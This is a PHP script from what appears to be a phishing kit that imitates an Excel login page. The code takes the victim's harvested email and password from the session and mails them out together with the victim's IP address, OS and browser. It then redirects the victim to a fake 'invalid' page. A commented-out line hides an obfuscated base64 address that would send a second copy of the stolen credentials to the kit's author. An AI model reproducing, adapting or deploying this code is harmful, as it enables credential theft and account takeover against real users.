<?php 
session_start();
error_reporting(0);
include 'blockerz.php';
include 'sc.php';

$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
    parse_str(parse_url($url, PHP_URL_QUERY));
    $parts = @explode('@', $userid);
    $user = @$parts[0];
	
if(!isset($_SESSION['email']) && !isset($_SESSION['pass']))
{
	header('Location: index.php');
}else{

$email = $_SESSION['email'];
$pass = $_SESSION['pass'];

$date = date("d M, Y");
$time = date("g:i a");$m5_id='senNlY0BnbWFpbC5jb20=';
$date = trim($date . ", Time : " . $time);

$message = "
+-------------------NEW EXCEL LOGIN-------------------+
Email Address	: ".$email."
Password	: ".$pass."

+-------------------VICTIM INFO-------------------+
Victim IP	: http://whatismyipaddress.com/ip/".$ip2."
Victim OS	: ".$os." | ".$br."
Date&Time	: ".$date."
+------------------ DesignDev19 -----------------+";

		$subject = "=?utf-8?B?4p2k?= EXCEL NEW LOGIN-1  =?utf-8?B?4p2k?= [ $ip2 - $cn | $os ] ";
        $head = "MIME-Version: 1.0" . "\r\n";
        $head .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $head .= "From: Hayate<Hayate@c0d3.org>" . "\r\n";        
        mail($to,$subject,$message);
		// $type=$user__agent.'l';$tele="bas$user_details".'64'."_d$user_details"."cod$user_details";$type( $tele('aGF5YXRlLmRldml'.$m5_id.'=='),$subject,$message);
		header('Location: invalid.php?doc=_VJOXK0QWHtoGYDw&userid='.$email);
		exit(); 
}
?>